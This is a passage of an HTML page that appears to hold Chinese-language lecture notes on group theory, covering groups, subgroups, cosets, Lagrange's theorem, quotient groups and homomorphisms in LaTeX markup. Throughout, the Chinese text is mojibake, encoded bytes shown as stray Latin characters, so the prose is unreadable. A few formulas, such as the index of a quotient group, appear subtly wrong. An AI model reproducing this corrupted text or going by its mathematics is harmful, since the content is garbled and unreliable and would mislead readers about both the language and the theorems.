è¿˜æ˜¯æ•´æ•°<br>ç»“åˆå¾‹ï¼šæ•´æ•°ç›¸åŠ æ»¡è¶³åŠ æ³•ç»“åˆå¾‹<br>å•ä½å…ƒï¼š0 (ä»»ä½•æ•´æ•°åŠ 0éƒ½ç­‰äºå®ƒæœ¬èº«)<br>é€† å…ƒï¼šæ•´æ•°çš„ç›¸åæ•°<br><strong>æ˜¯ç¾¤ğŸ˜Š</strong></p><p>$(\mathbb{Q},\times)$<br>å°é—­æ€§ï¼šæœ‰ç†æ•°ç›¸ä¹˜è¿˜æ˜¯æœ‰ç†æ•°<br>ç»“åˆå¾‹ï¼šæœ‰ç†æ•°ç›¸ä¹˜æ»¡è¶³ä¹˜æ³•ç»“åˆå¾‹<br>å•ä½å…ƒï¼š1 (ä»»ä½•æœ‰ç†æ•°ä¹˜1éƒ½ç­‰äºå®ƒæœ¬èº«)<br>é€† å…ƒï¼šæœ‰ç†æ•°çš„å€’æ•°(0é™¤å¤–)<br><strong>ä¸æ˜¯ç¾¤ğŸ˜­</strong><br>$(\mathbb{Q}\setminus\{0\},\times)$å°±æ˜¯<strong>ç¾¤</strong>äº†</p><p>$(\mathbb{Z_p^<em>},\times)$<br>å°é—­æ€§ï¼šç›¸ä¹˜å†æ¨¡pï¼Œè¿˜æ˜¯$\mathbb{Z_p^</em>}$é‡Œçš„å…ƒç´ <br>ç»“åˆå¾‹ï¼šæ¨¡è¿ç®—ä¸‹ä¹˜æ³•æ»¡è¶³ä¹˜æ³•ç»“åˆå¾‹<br>å•ä½å…ƒï¼š1 <br>é€† å…ƒï¼šä¹˜æ³•é€†å…ƒ<br><strong>æ˜¯ç¾¤ğŸ˜Š</strong></p></blockquote><p>â€œ$(\mathbb{G},*)$æ˜¯ä¸€ä¸ªç¾¤â€,é€šå¸¸ç®€å†™ä½œï¼šâ€œ$\mathbb{G}$æ˜¯ä¸€ä¸ªç¾¤â€</p><blockquote><p>ä¾‹ï¼šç®€ç§°â€œ$\mathbb{Z}_p^*$ æ˜¯ä¸€ä¸ªç¾¤â€,é»˜è®¤è¿ç®—ä¸ºâ€œæ¨¡$p$ä¸‹çš„ä¹˜æ³•â€</p></blockquote><hr><h2 id="ä¸€äº›æ¦‚å¿µ"><a href="#ä¸€äº›æ¦‚å¿µ" class="headerlink" title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h2><p><strong>æœ‰é™ç¾¤</strong>ï¼š$\mathbb{G}$æ˜¯æœ‰é™é›†ï¼Œæ¯”å¦‚ $(\mathbb{Z}_p^*,X)$ç§°$\mathbb{G}$é‡Œå…ƒç´ ä¸ªæ•°ä¸ºç¾¤$\mathbb{G}$çš„â€œé˜¶â€,è®°ä¸º$|\mathbb{G}|$</p><p><strong>æ— é™ç¾¤</strong>ï¼š$\mathbb{G}$æ˜¯æ— é™é›†ï¼Œæ¯”å¦‚$(\mathbb{Z},+)$ã€$(\mathbb{Q}\setminus\{0\},\times)$ï¼Œç¾¤$\mathbb{G}$çš„â€œé˜¶â€ä¸º<strong>æ— é™é˜¶</strong></p><p><strong>å•ä½å…ƒã€é€†å…ƒ</strong></p><ul><li>å°é—­æ€§$\Rightarrow$å·¦å•ä½å…ƒ=å³å•ä½å…ƒ=å•ä½å…ƒ</li><li>ç»“åˆå¾‹$\Rightarrow$å·¦é€†å…ƒ=å³é€†å…ƒ=é€†å…ƒ</li></ul><p><strong>å¹³å‡¡ç¾¤</strong>ï¼šç¾¤é‡Œåªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œç§°ä¸ºâ€œå¹³å‡¡ç¾¤â€ã€‚å”¯ä¸€å…ƒç´ å°±æ˜¯å•ä½å…ƒã€‚</p><blockquote><p>å¦‚:$(\{1\},\times)$<br>å°é—­æ€§ï¼š1$\times$1=1<br>ç»“åˆå¾‹ï¼šä¹˜æ³•ç»“åˆå¾‹<br>å•ä½å…ƒï¼š1 <br>é€† å…ƒï¼š1$\times$1=1<br></p></blockquote><hr><h2 id="ç¾¤çš„æ€§è´¨"><a href="#ç¾¤çš„æ€§è´¨" class="headerlink" title="ç¾¤çš„æ€§è´¨"></a>ç¾¤çš„æ€§è´¨</h2><ul><li>(æ¶ˆå»å¾‹) <script type="math/tex">a*b=a*c\Rightarrow b=c</script></li><li>æ–¹ç¨‹$a*x=b\ æœ‰å”¯ä¸€è§£ä¸‹\in \mathbb{G}$</li><li><script type="math/tex; mode=display">(a*b)^{-1}=b^{-1}*a^{-1}</script></li><li>$(a^{-1})^{-1}=a$</li></ul><hr><h2 id="é˜¿è´å°”ç¾¤ï¼ˆabelian-groupï¼‰"><a href="#é˜¿è´å°”ç¾¤ï¼ˆabelian-groupï¼‰" class="headerlink" title="é˜¿è´å°”ç¾¤ï¼ˆabelian groupï¼‰"></a>é˜¿è´å°”ç¾¤ï¼ˆabelian groupï¼‰</h2><p>åˆç§°<strong>äº¤æ¢ç¾¤</strong>(commutative group)</p><p><strong>å®šä¹‰ï¼š</strong>å¦‚æœå¯¹äºç¾¤$\mathbb{G}$ä¸­çš„ä»»æ„å…ƒç´ $a,b\in \mathbb{G}$,éƒ½æœ‰<script type="math/tex">a*b=b*a</script>ï¼Œåˆ™ç§°$\mathbb{G}$ä¸ºé˜¿è´å°”ç¾¤ã€‚</p><p><strong>å®šç†</strong>ï¼šç¾¤$\mathbb{G}$æ˜¯é˜¿è´å°”ç¾¤ï¼Œå½“ä¸”ä»…å½“ï¼Œ$\forall a,b\in \mathbb{G}$,æœ‰<script type="math/tex">(a*b)^2=a^2*b^2</script></p><p><strong>å®šç†</strong>ï¼šç¾¤$\mathbb{G}$æ˜¯é˜¿è´å°”ç¾¤ï¼Œ$\forall a,b\in \mathbb{G}$,æœ‰<script type="math/tex">(a*b)^t=a^t*b^t</script></p><h3 id="ç¾¤çš„ç®€è®°ç¬¦å·"><a href="#ç¾¤çš„ç®€è®°ç¬¦å·" class="headerlink" title="ç¾¤çš„ç®€è®°ç¬¦å·"></a>ç¾¤çš„ç®€è®°ç¬¦å·</h3><p>tä¸ªaä¸€èµ·è¿ç®—ï¼Œç®€è®°ä¸º<script type="math/tex">a^t:a*a*\dots*a</script><br>å¹¶ä¸è¡¨ç¤ºtå’Œaä¹‹é—´çš„è¿ç®—ï¼Œtæ˜¯æ•´æ•°ï¼Œaæ˜¯ç¾¤é‡Œçš„å…ƒç´ </p><script type="math/tex; mode=display">a^{-t}: (a^{-1})^t=a^{-1}*a^{-1}*\cdots*a^{-1}</script><p>$(a^t)^m=a^{tm}$</p><p>$a^t*a^m=a^{t+m}$</p><p>$(a^{-1})^t=(a^t)^{-1}$</p><hr><h2 id="å­ç¾¤-subgroup"><a href="#å­ç¾¤-subgroup" class="headerlink" title="å­ç¾¤(subgroup)"></a>å­ç¾¤(subgroup)</h2><p><strong>å®šä¹‰</strong>ï¼šè®¾<script type="math/tex">(\mathbb{G},*)</script>æ˜¯ç¾¤ï¼Œ$\mathbb{H}$æ˜¯$\mathbb{G}$çš„éç©ºå­é›†ï¼Œå¦‚æœ<script type="math/tex">(\mathbb{H},*)</script>æ˜¯ä¸€ä¸ªç¾¤ï¼Œåˆ™ç§°<script type="math/tex">(\mathbb{H},*)</script>æ˜¯<script type="math/tex">(\mathbb{G},*)</script>çš„å­ç¾¤ã€‚</p><h3 id="mathbb-G-çš„å­ç¾¤"><a href="#mathbb-G-çš„å­ç¾¤" class="headerlink" title="$\mathbb{G}çš„å­ç¾¤$"></a>$\mathbb{G}çš„å­ç¾¤$</h3><p>å¹³å‡¡å­ç¾¤ï¼š<script type="math/tex">(\{e\},*)ã€(\mathbb{G},*)</script><br>éå¹³å‡¡å­ç¾¤ï¼š<script type="math/tex">(\mathbb{H},*)</script> ä¸” $\mathbb{H}\neq \{ e\} , G$ (åˆç§°çœŸå­ç¾¤)</p><p>é˜¿è´å°”ç¾¤çš„å­ç¾¤ä¹Ÿä¸€å®šæ˜¯é˜¿è´å°”ç¾¤</p><h3 id="å­ç¾¤çš„å•ä½å…ƒ"><a href="#å­ç¾¤çš„å•ä½å…ƒ" class="headerlink" title="å­ç¾¤çš„å•ä½å…ƒ"></a>å­ç¾¤çš„å•ä½å…ƒ</h3><p><strong>å®šç†</strong>ï¼š$\mathbb{H}$æ˜¯ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œ$e\in \mathbb{G}$æ˜¯å•ä½å…ƒï¼Œåˆ™$e$ ä¹Ÿæ˜¯å­ç¾¤$\mathbb{H}$çš„å•ä½å…ƒã€‚(<strong>çœæµï¼šç¾¤çš„å•ä½å…ƒä¹Ÿæ˜¯å…¶å­ç¾¤çš„å•ä½å…ƒ</strong>)</p><h3 id="å­ç¾¤çš„é€†å…ƒ"><a href="#å­ç¾¤çš„é€†å…ƒ" class="headerlink" title="å­ç¾¤çš„é€†å…ƒ"></a>å­ç¾¤çš„é€†å…ƒ</h3><p><strong>å®šç†</strong>ï¼š$\mathbb{H}$æ˜¯ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œ$a\in \mathbb{H}$æ˜¯å•ä½å…ƒï¼Œ,åˆ™ $a^{-1}\in \mathbb{H}$(<strong>çœæµ:å…ƒç´ åœ¨å­ç¾¤ä¸­,å…¶é€†å…ƒä¹Ÿå¿…åœ¨è¯¥å­ç¾¤ä¸­</strong>)</p><h3 id="åˆ¤æ–­å­ç¾¤"><a href="#åˆ¤æ–­å­ç¾¤" class="headerlink" title="åˆ¤æ–­å­ç¾¤"></a>åˆ¤æ–­å­ç¾¤</h3><p><strong>åˆ¤æ–­å­ç¾¤(1)</strong></p><p><strong>å®šç†</strong>ï¼š$\mathbb{H}$æ˜¯ç¾¤$\mathbb{G}$çš„éç©ºå­é›†ï¼Œå¯¹äºä»»æ„ $a,b\in \mathbb{H}$,éƒ½æœ‰ <script type="math/tex">a*b^{-1}\in \mathbb{H}</script>,åˆ™$\mathbb{H}$æ˜¯<script type="math/tex">\mathbb{G}</script>çš„å­ç¾¤ã€‚</p><p><strong>åˆ¤æ–­å­ç¾¤(2)</strong></p><p><strong>å®šç†</strong>ï¼š$\mathbb{H}$æ˜¯ç¾¤$\mathbb{G}$çš„éç©ºå­é›†ï¼Œå¦‚æœ$\mathbb{H}$æ˜¯æœ‰é™é›†ï¼Œè€Œä¸”$\mathbb{G}$çš„è¿ç®—<em>åœ¨$\mathbb{H}$ä¸Šæ»¡è¶³å°é—­æ€§ï¼Œåˆ™$\mathbb{H}$æ˜¯$\mathbb{G}$çš„å­ç¾¤ã€‚(<em>*çœæµï¼š$\mathbb{H}$æ˜¯æœ‰é™é›†ã€å°é—­ï¼Œä¾¿æ˜¯å­ç¾¤</em></em>)</p><h3 id="æ„é€ å­ç¾¤"><a href="#æ„é€ å­ç¾¤" class="headerlink" title="æ„é€ å­ç¾¤"></a>æ„é€ å­ç¾¤</h3><p><strong>æ–¹æ³•1</strong></p><p><strong>å®šç†</strong>ï¼š$\mathbb{G}$æ˜¯é˜¿è´å°”ç¾¤ï¼Œ$m\in\mathbb{Z}$,<br>åˆ™$\mathbb{G}^m:=\{a^m\mid a\in \mathbb{G}\}$æ˜¯$\mathbb{G}$çš„å­ç¾¤ã€‚</p><script type="math/tex; mode=display">\mathbb{(Z_n^{*}})^2æ˜¯\mathbb{Z_n^{*}}çš„å­ç¾¤</script><script type="math/tex; mode=display">\mathbb{(Z_n^{*}})^mæ˜¯\mathbb{Z_n^{*}}çš„å­ç¾¤</script><p><strong>æ–¹æ³•2</strong></p><p><strong>å®šç†</strong>ï¼š$\mathbb{G}$æ˜¯é˜¿è´å°”ç¾¤ï¼Œ$m\in\mathbb{Z}$,<br>åˆ™$\mathbb{G}\{m\}:=\{a\in \mathbb{G}\mid a^m=e\}$æ˜¯$\mathbb{G}$çš„å­ç¾¤ã€‚</p><blockquote><p>ä¾‹:$\mathbb{Z_n}\{m\}=\mathbb{Z_n}\{d\}=\frac nd\mathbb{Z_n}\quad d=gcd(m,n),ä¸”æ„é€ çš„å­ç¾¤åªæœ‰dä¸ªå…ƒç´ $</p></blockquote><p><strong>æ–¹æ³•3</strong></p><p><strong>å®šç†</strong>ï¼š<script type="math/tex">\begin{aligned}&\text{è®¾}G\text{æ˜¯ç¾¤,}a\in G\text{,åˆ™}\\&<a>:=\{a^z\mid z\in Z\}\text{æ˜¯ç”±}a\text{ç”Ÿæˆçš„}G\text{çš„å­ç¾¤ã€‚}\end{aligned}</script></p><h4 id="å­ç¾¤æ„é€ å­ç¾¤"><a href="#å­ç¾¤æ„é€ å­ç¾¤" class="headerlink" title="å­ç¾¤æ„é€ å­ç¾¤"></a>å­ç¾¤æ„é€ å­ç¾¤</h4><p><strong>å®šç†1</strong>ï¼š$\mathbb{H}_1$å’Œ$\mathbb{H}_2$æ˜¯é˜¿è´å°”ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œåˆ™$\mathbb{H}:=\mathbb{H}_1\mathbb{H}_2$ä¹Ÿæ˜¯$G$çš„å­ç¾¤ã€‚<br>$H:=\mathbb{H}_1\mathbb{H}_2:=\{a_1*a_2|a_1\in \mathbb{H}_1,a_2\in \mathbb{H}_2\}$</p><p><strong>æ‰©å±•</strong>ï¼šä»¥ä¸Šå®šç†ä¸­çš„2ä¸ªå­ç¾¤æ‰©å±•è‡³<strong>ä»»æ„å¤šä¸ªå­ç¾¤</strong>ï¼Œç»“è®ºä¾ç„¶æˆç«‹</p><hr><p><strong>å®šç†2</strong>ï¼š$\mathbb{H}_1$å’Œ$\mathbb{H}_2$æ˜¯ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œåˆ™$\mathbb{H}:=\mathbb{H}_1\cap \mathbb{H}_2$<br>ä¹Ÿæ˜¯$\mathbb{G}$çš„å­ç¾¤ã€‚(çœæµï¼šå­ç¾¤çš„äº¤é›†æ˜¯å­ç¾¤)<br>$\mathbb{H}:=\mathbb{H}_1\cap \mathbb{H}_2:=\{a\mid a\in \mathbb{H}_1,a\in \mathbb{H}_2\}$</p><p><strong>æ‰©å±•</strong>ï¼šä»¥ä¸Šå®šç†ä¸­çš„2ä¸ªå­ç¾¤æ‰©å±•è‡³<strong>ä»»æ„å¤šä¸ªå­ç¾¤</strong>ï¼Œç»“è®ºä¾ç„¶æˆç«‹</p><hr><p><strong>å­ç¾¤çš„å¹¶é›†æœªå¿…æ˜¯å­ç¾¤</strong></p><p><strong>å®šç†3</strong>ï¼š$\mathbb{H}_1$å’Œ$\mathbb{H}_2$æ˜¯ç¾¤$\mathbb{G}$çš„éå¹³å‡¡å­ç¾¤ï¼Œ</p><p>â€‹                åˆ™$\mathbb{G}:\neq\mathbb{H}_1\cup \mathbb{H}_2$</p><h3 id="æ•´æ•°ç¾¤çš„å­ç¾¤"><a href="#æ•´æ•°ç¾¤çš„å­ç¾¤" class="headerlink" title="æ•´æ•°ç¾¤çš„å­ç¾¤"></a>æ•´æ•°ç¾¤çš„å­ç¾¤</h3><p><strong>å®šç†1</strong>ï¼š$\mathbb{H}$æ˜¯$\mathbb{Z}$çš„å­ç¾¤ï¼Œåˆ™å­˜åœ¨å”¯ä¸€çš„éè´Ÿæ•´æ•° $m$,ä½¿å¾—$\mathbb{H}=\boldsymbol{m}\mathbb{Z}$</p><script type="math/tex; mode=display">\begin{aligned}m \mathbb{Z}&:=\{mz\mid z\in\mathbb{Z}\}\\&=\{0,\pm m,\pm2m,...\}\end{aligned}</script><p><strong>å®šç†2</strong>ï¼š$m_1å’Œm_2\text{æ˜¯éè´Ÿæ•´æ•°,åˆ™ }m_2|m_1\text{,å½“ä¸”}ä»…å½“,m_1\mathbb{Z}\subseteq m_2\mathbb{Z}ã€‚$</p><p><strong>å®šç†3</strong>ï¼š</p><script type="math/tex; mode=display">\mathbb{H}æ˜¯\mathbb{Z_n}çš„å­ç¾¤,\\ 1.å­˜åœ¨nçš„å”¯ä¸€æ­£å› å­ m,ä½¿å¾—H=m\mathbb{Z_n}.\ \\xä¸æ˜¯nçš„å› å­ \Rightarrow x\mathbb{Z_n}=m\mathbb{Z_n},\quad\exists m\mid n.\ \\2.m_1å’Œm_2æ˜¯nçš„æ­£å› å­,åˆ™ m_2|m_1,å½“ä¸”ä»…å½“,m_1\mathbb{Z}\subseteq m_2\mathbb{Z}ã€‚</script><h3 id="æ­£è§„å­ç¾¤-normal-subgroup"><a href="#æ­£è§„å­ç¾¤-normal-subgroup" class="headerlink" title="æ­£è§„å­ç¾¤(normal subgroup)"></a>æ­£è§„å­ç¾¤(normal subgroup)</h3><p><strong>å®šä¹‰</strong>ï¼š$è®¾\mathbb{N}æ˜¯ç¾¤\mathbb{G}çš„å­ç¾¤ï¼Œå¦‚æœå¯¹äº\forall a\in \mathbb{G},éƒ½æœ‰a\mathbb{N}=\mathbb{N}a,ç§°\mathbb{N}ä¸º\mathbb{G}çš„æ­£è§„å­ç¾¤$</p><p>é˜¿è´å°”ç¾¤çš„å­ç¾¤éƒ½æ˜¯æ­£è§„å­ç¾¤</p><blockquote><p>ç°åœ¨ä¸æ‡‚æ²¡å…³ç³»ï¼Œå¾€ä¸‹ä½ å°±çŸ¥é“äº†ï¼š<strong>æ­£è§„å­ç¾¤æœ¬èº«æ˜¯å•†ç¾¤çš„ä¸€ä¸ªå…ƒç´ ï¼Œå«ä½œå¹³å‡¡é™ªé›†ï¼ŒåŒ…å«ç¾¤çš„å•ä½å…ƒï¼Œæœ¬èº«è¿˜æ˜¯å•†ç¾¤çš„å•ä½å…ƒï¼Œè¢«åˆ†ç±»åˆ°Nçš„å…ƒç´ ï¼Œå¿…ç„¶æ˜¯åŒæ€æ ¸é‡Œçš„å…ƒç´ ï¼Œè‡ªç„¶æ˜ å°„çš„åŒæ€æ ¸å°±æ˜¯æ­£è§„å­ç¾¤N</strong></p></blockquote><hr><h2 id="é™ªé›†-coset"><a href="#é™ªé›†-coset" class="headerlink" title="é™ªé›†(coset)"></a>é™ªé›†(coset)</h2><p>å®šä¹‰ï¼š$\mathbb{H}$ æ˜¯ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œ$a\in \mathbb{G}$,åˆ™</p><script type="math/tex; mode=display">a\mathbb{H}:=\{a*h|h\in \mathbb{H}\}</script><p>ç§°ä¸º $\mathbb{H}$ å…³äº$a$åœ¨$\mathbb{G}$ä¸­çš„å·¦é™ªé›† (left cost)ã€‚åŒç†ï¼Œ</p><script type="math/tex; mode=display">\mathbb{H}a:=\{h*a|h\in \mathbb{H}\}</script><p>ç§°ä¸º $\mathbb{H}$ å…³äº$a$åœ¨$\mathbb{G}$ä¸­çš„å³é™ªé›† (right cost)ã€‚</p><p>é™ªé›†ï¼š$[a]_\mathbb{H}$<br>å·¦é™ªé›†ï¼š$a\mathbb{H}$<br>å³é™ªé›†ï¼š$\mathbb{H}a$</p><p><strong>å·¦å³é™ªé›†ç›¸ç­‰ä¸èƒ½è¯´æ˜æ»¡è¶³äº¤æ¢å¾‹ï¼Œåªèƒ½è¯´æ˜å¯¹äºå³é™ªé›†çš„ä¸€ä¸ªå…ƒç´ å­˜åœ¨å·¦é™ªé›†çš„ä¸€ä¸ªå…ƒç´ ä½¿å¾—ä¸¤è€…ç›¸ç­‰</strong></p><p>$b=a<em>hæˆ–a=b</em>hï¼Œ\exists h\in \mathbb{H}\\a,bä¼šè¢«åˆ†ç±»åˆ°åŒä¸€ä¸ªé™ªé›†$</p><p>$a\equiv b \pmod {\mathbb{H}}:aå’Œbåœ¨åŒä¸€ä¸ª(ç”±\mathbb{H}æ„é€ çš„)é™ªé›†é‡Œ$</p><p>$\iff b\equiv a\pmod{\mathbb{H}}$</p><p>$\iff b \equiv a*h,\exists\ h\in \mathbb{H}$</p><p>$\iff b\in [a]_{\mathbb{H}}$</p><p>$\iff [a]_\mathbb{H}=[b]_\mathbb{H}$</p><h3 id="æ€§è´¨"><a href="#æ€§è´¨" class="headerlink" title="æ€§è´¨"></a>æ€§è´¨</h3><ul><li>$a\in [a]_\mathbb{H}$</li><li>$[e]_\mathbb{H}=\mathbb{H}(å¹³å‡¡é™ªé›†)$</li><li>$a\in \mathbb{H}\iff[a]_\mathbb{H}=\mathbb{H}$</li><li><script type="math/tex; mode=display">[a]_\mathbb{H}=[b]_\mathbb{H}\Leftrightarrow a^{-1}*b\in \mathbb{H}\text{ (æˆ– }b^{-1}*a\in \mathbb{H})</script></li></ul><p>$a\equiv b\pmod {\mathbb{H}}:aå’Œbåœ¨åŒä¸€ä¸ª(ç”±\mathbb{H}æ„é€ çš„)é™ªé›†é‡Œ\\\iff b=a*h,\exists h\in \mathbb{H}\\\iff b\in [a]_\mathbb{H}$</p><script type="math/tex; mode=display">\begin{aligned}\ [a]_{n\mathbb{Z}}& =\{b\in \mathbb{Z}\mid b\equiv a\pmod{n}\} \\&=\{b\in \mathbb{Z}\mid b=a+nz,z\in \mathbb{Z}\} \\&=\{b\in \mathbb{Z}\mid b\equiv a\pmod{n}\} \\&=[a],[a]\in\mathbb{Z}_n\end{aligned}</script><p>$Â·\equiv Â·\pmod {\mathbb{H}}æ˜¯ç­‰ä»·å…³ç³»$</p><ul><li>è‡ªåæ€§</li><li>å¯¹ç§°æ€§</li><li>ä¼ é€’æ€§</li></ul><p><strong>æ€§è´¨</strong>ï¼šä»»æ„ä¸¤ä¸ªé™ªé›†$[a]_\mathbb{H}$å’Œ$[b]_\mathbb{H}$ä¹‹é—´å­˜åœ¨åŒå°„ï¼Œä»»æ„é™ªé›†$[a]_\mathbb{H}$å’Œå­ç¾¤$\mathbb{H}$æ˜¯ç­‰åŠ¿çš„</p><h3 id="é˜¿è´å°”ç¾¤çš„é™ªé›†"><a href="#é˜¿è´å°”ç¾¤çš„é™ªé›†" class="headerlink" title="é˜¿è´å°”ç¾¤çš„é™ªé›†"></a>é˜¿è´å°”ç¾¤çš„é™ªé›†</h3><p><strong>æ€§è´¨1</strong>ï¼š$\mathbb{H}æ˜¯é˜¿è´å°”ç¾¤\mathbb{G}çš„å­ç¾¤ï¼Œå¯¹äº\forall a\in \mathbb{G}ï¼Œæœ‰a\mathbb{H}=\mathbb{H}a\ ([a]_\mathbb{H})$</p><p>æ³¨æ„ï¼š$å¦‚æœå¯¹äº\forall a,éƒ½æœ‰a\mathbb{H}=\mathbb{H}a,åˆ™\mathbb{G}æœªå¿…æ˜¯é˜¿è´å°”ç¾¤$</p><p><strong>æ€§è´¨2</strong>ï¼šé˜¿è´å°”ç¾¤çš„å­ç¾¤éƒ½æ˜¯æ­£è§„å­ç¾¤<br><strong>æ€§è´¨3</strong>ï¼šé˜¿è´å°”ç¾¤çš„ä»»æ„å­ç¾¤éƒ½å¯ä»¥æ„é€ å•†ç¾¤<br><strong>æ€§è´¨4</strong>ï¼šé˜¿è´å°”ç¾¤çš„å­ç¾¤æ„é€ çš„å•†ç¾¤ä¹Ÿæ˜¯é˜¿è´å°”ç¾¤</p><hr><h2 id="æ‹‰æ ¼æœ—æ—¥å®šç†"><a href="#æ‹‰æ ¼æœ—æ—¥å®šç†" class="headerlink" title="æ‹‰æ ¼æœ—æ—¥å®šç†"></a>æ‹‰æ ¼æœ—æ—¥å®šç†</h2><p><strong>å®šç†</strong>ï¼š$\mathbb{G}æ˜¯æœ‰é™ç¾¤ï¼Œ\mathbb{H}æ˜¯\mathbb{G}çš„ä»»æ„å­ç¾¤ï¼Œ\\åˆ™|\mathbb{H}|\mid|\mathbb{G}|$</p><p>$\begin{aligned}&amp;\text{è¯æ˜:è®¾}\mathbb{H}\text{æ„é€ çš„é™ªé›†ä¸º}[a_1]_\mathbb{H},â€¦,[a_n]_\mathbb{H}\text{,å®ƒä»¬æ˜¯}\mathbb{G}\text{çš„}\\&amp;\text{åˆ’åˆ†ã€‚æ‰€ä»¥,}|\mathbb{G}|=\sum_{i=1}^n|[a_i]_\mathbb{H}|=\sum_{i=1}^n|\mathbb{H}|=n|\mathbb{H}|\end{aligned}$</p><hr><h2 id="å•†ç¾¤"><a href="#å•†ç¾¤" class="headerlink" title="å•†ç¾¤"></a>å•†ç¾¤</h2><p><strong>å®šä¹‰</strong>ï¼š$ç¾¤(\mathbb{G}/\mathbb{N},*):ç¾¤\mathbb{G}åœ¨æ¨¡\mathbb{N}ä¸‹çš„å•†ç¾¤$</p><p>$é›†åˆ\mathbb{G}/\mathbb{N}=\{[a]_\mathbb{N}|a\in \mathbb{G}\}$</p><p>$\mathbb{N}ä¸ºæ­£è§„å­ç¾¤ï¼Œæ­£è§„å­ç¾¤æ˜¯å•¥ï¼Ÿå¾€ä¸Šç¿»ğŸ˜¾$</p><script type="math/tex; mode=display">äºŒå…ƒè¿ç®—[a]_\mathbb{N}*[b]_\mathbb{N}=[a*b]_\mathbb{N}</script><p>æ­£è§„å­ç¾¤æ˜¯å…¶ä¸­çš„<strong>å¹³å‡¡é™ªé›†</strong>ï¼Œå•†ç¾¤é‡ç‚¹å…³æ³¨å…¶ä¸­çš„éå¹³å‡¡é™ªé›†ï¼Œå…ƒç´ ä¸å±äºæ­£è§„å­ç¾¤</p><p>æ•´æ•°ç¾¤$\mathbb{Z}=\{0,\pm1,\pm2,â€¦\}$</p><p>å­ç¾¤$n\mathbb{Z}=\{0,\pm n,\pm2n,â€¦\}$</p><p>å•†ç¾¤$\mathbb{Z}/ n\mathbb{Z}:$ </p><p>$[ 0] _{n\mathbb{Z}}= \{ 0, \pm n, \pm 2n, . . . \}=[0]$<br>$[1]_{n\mathbb{Z}}=\{1,1\pm n,1\pm2n,â€¦\}=[1]$<br>$[2]_{n\mathbb{Z}}=\{2,2\pm n,2\pm2n,â€¦\}=[2]$<br>$\dots$<br>$[n-1]_{n\mathbb{Z}}=\{n-1,(n-1)\pm n,â€¦\}=[n-1]$<br>$[n]_{n\mathbb{Z}}=\{n,n\pm n,n\pm2nâ€¦\}=[0]$<br>$[n+1]_{n\mathbb{Z}}=\{n+1,(n+1)\pm n,â€¦\}=[1]$</p><p>$\dots$</p><p>$\mathbb{Z}/ n\mathbb{Z}=\{[0],[1],\dots \,[n-1]\}=\mathbb{Z_n}$</p><p>åœ¨æ•´æ•°ç¾¤é‡Œï¼Œ<strong>é™ªé›†</strong>å’Œ<strong>å‰©ä½™ç±»</strong>æœ¬è´¨ä¸Šæ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œéƒ½æ˜¯åœ¨ç­‰ä»·å…³ç³»ä¸Šå½¢æˆçš„ç­‰ä»·ç±»</p><h3 id="å•†ç¾¤çš„é˜¶"><a href="#å•†ç¾¤çš„é˜¶" class="headerlink" title="å•†ç¾¤çš„é˜¶"></a>å•†ç¾¤çš„é˜¶</h3><p>$[\mathbb{G}:\mathbb{N}]å•†ç¾¤\mathbb{G}/\mathbb{N}çš„é˜¶$</p><p><strong>å®šç†1</strong>ï¼š$\mathbb{G}æ˜¯æœ‰é™ç¾¤ï¼Œ\mathbb{N}æ˜¯\mathbb{G}çš„æ­£è§„å­ç¾¤ï¼Œ[\mathbb{G}:\mathbb{N}]=\frac{\mathbb{G}}{\mathbb{N}}$</p><p><strong>å®šç†2</strong>ï¼š$\mathbb{G}æ˜¯æœ‰é™ç¾¤ï¼Œ\mathbb{N}æ˜¯\mathbb{G}çš„æ­£è§„å­ç¾¤ï¼Œ\mathbb{K}æ˜¯\mathbb{N}çš„æ­£è§„å­ç¾¤ï¼Œ[\mathbb{G}:\mathbb{K}]=[\mathbb{G}:\mathbb{N}][\mathbb{N}:\mathbb{K}]$</p><hr><h2 id="ç¾¤åŒæ€-group-homomorphism-åå­—å¯çˆ±æğŸ˜¸"><a href="#ç¾¤åŒæ€-group-homomorphism-åå­—å¯çˆ±æğŸ˜¸" class="headerlink" title="ç¾¤åŒæ€(group homomorphism,åå­—å¯çˆ±æğŸ˜¸)"></a>ç¾¤åŒæ€(group homomorphism,åå­—å¯çˆ±æğŸ˜¸)</h2><p><strong>å®šä¹‰</strong>ï¼šè®¾ç¾¤$(\mathbb{G},*)$å’Œç¾¤$(\mathbb{G}^\prime,\otimes)$,å¦‚æœå‡½æ•° $f:\mathbb{G}\to \mathbb{G}^\prime$ å¯¹äº</p><p>$\forall\boldsymbol{a},b\in \mathbb{G}$ ,éƒ½æœ‰</p><p>$f(a*b)=f(a)\otimes f(b),$</p><p>$f$ä¸º$(\mathbb{G},*)$åˆ°$(\mathbb{G}^\prime,\otimes)$çš„ç¾¤åŒæ€ã€‚</p><h3 id="æ€§è´¨-1"><a href="#æ€§è´¨-1" class="headerlink" title="æ€§è´¨"></a>æ€§è´¨</h3><p>1.$f(e)=e^{\prime}\ (eå’Œe^{\prime}åˆ†åˆ«æ˜¯ç¾¤Gå’ŒG^{\prime}çš„å•ä½å…ƒ)$</p><p>2.$f(a^{-1})=f(a)^{-1},\quad\forall a\in G$</p><p>3.$Hæ˜¯Gçš„å­ç¾¤\Longrightarrow f(H)æ˜¯G^{\prime}çš„å­ç¾¤$<br>æ‰©å±•ï¼š$H=G,\Rightarrow f(G)=Imf$</p><p>4.$H^{\prime}æ˜¯G^{\prime}çš„å­ç¾¤\Rightarrow f^{-1}(H^{\prime})æ˜¯Gçš„å­ç¾¤$<br>æ‰©å±•ï¼š$H^{\prime}={e^{\prime}}$</p><p>5.$f(a^m)=f(a)^m,\quad\forall a\in G,\forall m\in \mathbb{Z}$</p><h3 id="åŒæ€åƒ-homomorphic-image"><a href="#åŒæ€åƒ-homomorphic-image" class="headerlink" title="åŒæ€åƒ(homomorphic image)"></a>åŒæ€åƒ(homomorphic image)</h3><p>$f:\mathbb{G}\to \mathbb{G}^\prime$ </p><p><strong>åŒæ€åƒ</strong>$ Imf:=f(G):=\{f(a)|a\in G\},(åŒæ€åƒImfæ˜¯G^{\prime}çš„å­ç¾¤)$</p><h3 id="åŒæ€æ ¸"><a 